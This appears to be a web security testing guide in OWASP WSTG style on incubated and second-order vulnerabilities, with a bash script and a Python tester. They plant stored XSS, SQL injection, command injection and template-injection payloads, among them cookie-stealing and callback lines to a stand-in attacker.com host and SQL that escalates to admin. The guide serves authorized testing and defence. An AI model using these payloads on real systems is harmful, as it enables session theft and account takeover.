# WSTG-INPV-14: Testing for Incubated Vulnerabilities

## Test ID
WSTG-INPV-14

## Test Name
Testing for Incubated Vulnerabilities

## High-Level Description

Incubated vulnerabilities are attacks where the malicious payload is stored initially and executed later in a different context or time. These include stored XSS that triggers on admin pages, time-delayed SQL injection, or payloads that activate when processed by scheduled jobs or different users.

---

## What to Check

- [ ] Stored payloads executed in different contexts
- [ ] Admin panel stored XSS
- [ ] Scheduled job exploitation
- [ ] Second-order SQL injection
- [ ] Email/notification triggers
- [ ] Report/export functionality exploitation

---

## How to Test

### Step 1: Identify Incubation Points

```bash
#!/bin/bash
TARGET="https://target.com"

echo "[*] Testing for Incubated Vulnerabilities..."

# Store payloads in various input fields
# Check if they trigger in admin panels, reports, or emails

# Register with malicious username
curl -s -X POST "$TARGET/register" \
    -d "username=<script>alert('XSS')</script>" \
    -d "email=test@test.com" \
    -d "password=test123"

# Submit feedback with payload
curl -s -X POST "$TARGET/feedback" \
    -d "name=Test" \
    -d "message=<script>fetch('http://attacker.com/'+document.cookie)</script>"

# Create order with malicious product name
curl -s -X POST "$TARGET/api/order" \
    -H "Content-Type: application/json" \
    -d '{"product":"<img src=x onerror=alert(1)>","qty":1}'
```

### Step 2: Incubated Vulnerability Tester

```python
#!/usr/bin/env python3
"""
Incubated Vulnerability Tester
Tests for second-order/delayed execution vulnerabilities
"""

import requests
import time
import uuid

class IncubatedVulnTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []
        self.session = requests.Session()
        self.unique_id = str(uuid.uuid4())[:8]

    # Incubated payloads with unique identifiers
    def get_payloads(self):
        return {
            'xss': [
                f'<script>fetch("http://attacker.com/xss?id={self.unique_id}")</script>',
                f'<img src=x onerror="fetch(\'http://attacker.com/xss?id={self.unique_id}\')">',
                f'"><script>document.location="http://attacker.com/steal?c="+document.cookie</script>',
            ],
            'sqli': [
                f"'; INSERT INTO users VALUES('{self.unique_id}', 'hacked'); --",
                f"'; UPDATE users SET role='admin' WHERE username='{self.unique_id}'; --",
                f"1'; WAITFOR DELAY '0:0:5'; --",  # Time-based for later
            ],
            'command': [
                f"; curl http://attacker.com/cmd?id={self.unique_id}",
                f"; nslookup {self.unique_id}.attacker.com",
            ],
            'ssti': [
                f"{{{{config}}}}",
                f"${{7*7}}",
                f"#{{7*7}}",
            ],
        }

    def test_user_registration(self):
        """Test user registration for incubated XSS in admin panel"""
        print("\n[*] Testing user registration incubation...")

        payloads = self.get_payloads()

        for payload in payloads['xss']:
            try:
                # Register with malicious username
                response = self.session.post(
                    f"{self.base_url}/register",
                    data={
                        'username': payload,
                        'email': f"test_{self.unique_id}@test.com",
                        'password': 'TestPass123!'
                    }
                )

                if response.status_code in [200, 201, 302]:
                    print(f"  [INFO] User registered with payload: {payload[:40]}...")
                    self.findings.append({
                        'type': 'Incubated XSS (Registration)',
                        'payload': payload,
                        'trigger': 'Admin user list/management',
                        'severity': 'High',
                        'note': 'Check admin panel for execution'
                    })

            except Exception as e:
                pass

    def test_feedback_system(self):
        """Test feedback/support system for incubated XSS"""
        print("\n[*] Testing feedback system incubation...")

        payloads = self.get_payloads()

        for payload in payloads['xss']:
            try:
                response = self.session.post(
                    f"{self.base_url}/feedback",
                    data={
                        'name': f"Test User {self.unique_id}",
                        'email': f"test_{self.unique_id}@test.com",
                        'subject': f"Test Subject {self.unique_id}",
                        'message': payload
                    }
                )

                if response.status_code in [200, 201, 302]:
                    print(f"  [INFO] Feedback submitted with payload")
                    self.findings.append({
                        'type': 'Incubated XSS (Feedback)',
                        'payload': payload,
                        'trigger': 'Admin reads feedback/support ticket',
                        'severity': 'High'
                    })

            except Exception as e:
                pass

    def test_order_processing(self):
        """Test order/transaction system"""
        print("\n[*] Testing order processing incubation...")

        payloads = self.get_payloads()

        malicious_order = {
            'product_name': payloads['xss'][0],
            'quantity': 1,
            'notes': payloads['sqli'][0],
            'shipping_address': payloads['xss'][1]
        }

        try:
            response = self.session.post(
                f"{self.base_url}/api/orders",
                json=malicious_order
            )

            if response.status_code in [200, 201]:
                print(f"  [INFO] Order created with malicious data")
                self.findings.append({
                    'type': 'Incubated Payload (Order)',
                    'trigger': 'Order processing, reports, invoices',
                    'severity': 'High',
                    'note': 'Check order reports, PDF generation, emails'
                })

        except Exception as e:
            pass

    def test_second_order_sqli(self):
        """Test second-order SQL injection"""
        print("\n[*] Testing second-order SQL injection...")

        # Store payload in profile
        sqli_payload = "admin'--"

        try:
            # Create user with SQLi payload as username
            self.session.post(
                f"{self.base_url}/register",
                data={
                    'username': sqli_payload,
                    'password': 'TestPass123!',
                    'email': f'test_{self.unique_id}@test.com'
                }
            )

            # Login
            self.session.post(
                f"{self.base_url}/login",
                data={
                    'username': sqli_payload,
                    'password': 'TestPass123!'
                }
            )

            # Trigger action that uses stored username
            response = self.session.get(f"{self.base_url}/profile")

            print(f"  [INFO] Second-order SQLi test completed")
            print(f"  [NOTE] Manually verify if injection triggered")
            self.findings.append({
                'type': 'Second-Order SQLi Test',
                'payload': sqli_payload,
                'trigger': 'Profile viewing, password reset, etc.',
                'severity': 'High',
                'note': 'Manual verification required'
            })

        except Exception as e:
            pass

    def test_scheduled_jobs(self):
        """Test payloads that might trigger in scheduled jobs"""
        print("\n[*] Testing scheduled job incubation...")

        # Create data that might be processed by batch jobs
        payloads = self.get_payloads()

        # Example: Submit data for report generation
        try:
            response = self.session.post(
                f"{self.base_url}/api/report/schedule",
                json={
                    'title': payloads['xss'][0],
                    'data_query': payloads['sqli'][0],
                    'format': 'pdf'
                }
            )

            if response.status_code in [200, 201]:
                self.findings.append({
                    'type': 'Scheduled Job Incubation',
                    'payload': 'XSS + SQLi in report',
                    'trigger': 'Scheduled report generation',
                    'severity': 'High',
                    'note': 'Check generated reports'
                })

        except Exception as e:
            pass

    def test_email_templates(self):
        """Test email/notification templates"""
        print("\n[*] Testing email template incubation...")

        payloads = self.get_payloads()

        # Trigger password reset or notification
        try:
            response = self.session.post(
                f"{self.base_url}/forgot-password",
                data={
                    'email': f"{payloads['xss'][0]}@test.com"
                }
            )

            # Or update profile with payload
            response = self.session.post(
                f"{self.base_url}/profile/update",
                data={
                    'display_name': payloads['xss'][0],
                    'bio': payloads['ssti'][0]
                }
            )

            self.findings.append({
                'type': 'Email Template Incubation',
                'trigger': 'Email notifications, password resets',
                'severity': 'Medium',
                'note': 'Check outgoing emails'
            })

        except Exception as e:
            pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("INCUBATED VULNERABILITY REPORT")
        print("="*60)
        print(f"\nUnique Test ID: {self.unique_id}")
        print("Use this ID to identify your payloads in callbacks/logs")

        if not self.findings:
            print("\nNo incubation points identified.")
        else:
            print(f"\n{len(self.findings)} potential incubation points found:\n")
            for f in self.findings:
                print(f"[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {str(f['payload'])[:50]}...")
                if 'trigger' in f:
                    print(f"  Trigger: {f['trigger']}")
                if 'note' in f:
                    print(f"  Note: {f['note']}")
                print()

    def run_tests(self):
        """Run all incubation tests"""
        self.test_user_registration()
        self.test_feedback_system()
        self.test_order_processing()
        self.test_second_order_sqli()
        self.test_scheduled_jobs()
        self.test_email_templates()
        self.generate_report()

# Usage
tester = IncubatedVulnTester("https://target.com")
tester.run_tests()
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Collaborator | OOB callback detection |
| XSS Hunter | Blind XSS detection |
| Custom scripts | Payload tracking |

---

## Remediation

```python
# Sanitize output everywhere, not just on input
# Input might be safe in one context but dangerous in another

from markupsafe import escape

def render_user_data(data):
    # Always escape when rendering
    return escape(data)

# Use Content Security Policy
# Prevents stored XSS from executing
response.headers['Content-Security-Policy'] = "default-src 'self'"

# Use parameterized queries for all database operations
# Prevents second-order SQL injection
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| Stored XSS in admin panel | 8.4 | High |
| Second-order SQL injection | 8.6 | High |
| Incubated command injection | 9.8 | Critical |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-79** | Cross-Site Scripting |
| **CWE-89** | SQL Injection |

---

## Checklist

```
[ ] User registration incubation tested
[ ] Feedback/support system tested
[ ] Order/transaction system tested
[ ] Second-order SQLi tested
[ ] Email templates tested
[ ] Scheduled jobs considered
[ ] Callback server monitored
[ ] Findings documented
```
